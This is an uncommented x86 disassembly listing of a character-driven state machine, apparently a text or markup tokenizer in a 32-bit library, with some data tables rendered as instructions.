mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov edi [ ebp + 0x14 ]
add esp 0x4
mov eax esi
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_100724f0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074005
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10074040
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x15
movzx eax [ eax + lookup_table_10074134 ]
jmp [ eax * 4 + jump_table_10074120 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x17
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_10072430
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10062120
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x15
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074139
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10074180
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x15
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_10074290 ]
jmp [ eax * 4 + jump_table_10074278 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ edx ] 0x18
call sub_10072430
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_10062120
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x15
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074296
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
push esi
mov esi [ ebp + 0x10 ]
cmp esi 0x2f
jne r-xdata
push ebx
cmp esi 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x19
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push esi
push eax
call sub_10062120
add esp 0xc
lea eax [ esi - 0x2d ]
pop esi
pop ebp
retn
lea eax [ esi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp esi 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_100729e0
add esp 0x4
pop ebx
pop esi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x1b
mov edx [ ebx + 0x8 ]
add edx 0x10
push edx
push esi
push ebx
call sub_10062120
lea eax [ esi - 0x41 ]
add esp 0xc
cmp eax 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x20
push ecx
push esi
push ebx
call sub_10062120
mov edx [ ebp + 0x14 ]
push edx
call sub_100729e0
add esp 0x10
pop ebx
pop esi
pop ebp
retn
add esi 0x20
sub_10074380
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_100729e0
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x1a
call sub_10072a50
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_100743f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10062120
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x15
call sub_100728b0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_100729e0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10001080
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10062120
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10074550 ]
jmp [ edx * 4 + jump_table_10074540 ]
call sub_10072af0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10074554
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10074590
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_10074674 ]
jmp [ ecx * 4 + jump_table_1007466c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_10024780
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0x7
add eax 0x15
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x15
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_10062120
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_10074676
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_100746b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_10074784 ]
jmp [ eax * 4 + jump_table_10074770 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1d
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ edx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074789
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_100747d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1c
movzx eax [ eax + lookup_table_100748ac ]
jmp [ eax * 4 + jump_table_10074898 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1e
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x1c
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_100748b1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_100748f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1c
movzx eax [ eax + lookup_table_100749e0 ]
jmp [ eax * 4 + jump_table_100749c8 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1f
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x1c
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
sub_100749e6
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x1c
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add esi 0x20
push esi
push edi
mov [ eax ] 0x20
call sub_1001bc80
push esi
push edi
call sub_1001c570
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x18
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074a90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_10074b74 ]
jmp [ ecx * 4 + jump_table_10074b6c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_10024780
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0xfffffff9
add eax 0x1c
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x1c
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_10062120
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_10074b76
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_10074bb0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_10074cec ]
jmp [ eax * 4 + jump_table_10074cd0 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ ecx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x22
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0xfffd
push esi
call sub_10062120
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100728b0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_100722b0
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebp + 0x10 ]
push edi
push edx
push ebx
call sub_10062120
add esp 0xc
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10061790
push ebx
call sub_10015610
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebx + 0x8 ]
lea eax [ esi - 0x41 ]
mov [ edx ] 0x22
cmp eax 0x19
ja r-xdata
sub_10074cf3
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
add al 0x6
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0xcccccccc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
lea ecx [ esi - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx eax [ eax + r-xdata ]
jmp [ eax * 4 + r-xdata ]
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x10 ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10072bf0
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x23
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10072bf0
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10072bf0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10072bf0
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100722b0
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x10
call sub_100722b0
add esp 0x4
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10061790
push ebx
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ esi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
sub_10074e2c
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x0
call sub_100728b0
push 0xf
mov eax ebx
call sub_100722b0
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_10074edc
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_10074f20
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_10075078 ]
jmp [ eax * 4 + jump_table_10075058 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ edx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x22
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0xfffd
push esi
call sub_10062120
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_100722b0
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_100728b0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_100722b0
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push ebx
call sub_10062120
add esp 0xc
lea edx [ esi + 0x50 ]
push edx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10061790
push ebx
call sub_10015610
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebx + 0x8 ]
lea ecx [ esi - 0x41 ]
mov [ eax ] 0x22
cmp ecx 0x19
ja r-xdata
sub_10075080
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_100750c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
inc eax
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x61
ja r-xdata
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x27
mov ebx [ edi + 0x8 ]
add ebx 0x3c
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
movzx eax [ eax + lookup_table_1007527c ]
jmp [ eax * 4 + jump_table_10075258 ]
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_10062120
add esp 0xc
mov esi [ edi + 0x8 ]
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10061790
lea eax [ esi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax edi
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x25
call sub_10072470
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax [ edx + 0x8 ]
pop edi
mov [ eax ] 0x27
pop esi
mov [ ecx + 0x4 ] 0x1
